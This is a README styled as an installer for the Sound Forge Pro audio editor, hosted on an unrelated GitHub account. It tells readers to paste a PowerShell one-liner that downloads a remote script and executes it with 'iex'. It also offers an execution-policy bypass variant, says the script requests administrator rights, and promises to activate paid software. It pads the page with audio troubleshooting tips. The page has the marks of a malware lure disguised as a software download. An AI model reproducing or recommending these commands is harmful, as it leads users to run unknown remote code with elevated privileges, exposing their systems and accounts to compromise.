# Sound Forge Pro Installer
the professional audio editor and mastering studio with 64-bit engine, 32-bit float processing, VST plugin support, and industry-standard tools for music production.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for ASIO audio driver and VST plugin host installation.
- Downloads MAGIX Sound Forge Pro installer with bundled iZotope processing plugins.
- Installs Sound Forge with the complete mastering suite and codec support library.
- Activates license via your MAGIX account and configures the default audio device.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~1200 MB free disk space

## Troubleshooting

**Recorded audio has a constant background hum or hiss**

Use the Noise Reduction plugin â€” sample the hum noise profile first, then apply reduction to the full track.

**Project playback stutters or glitches near complex audio effect chains**

Freeze processed tracks in Playback settings to reduce real-time CPU load from stacked effects.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.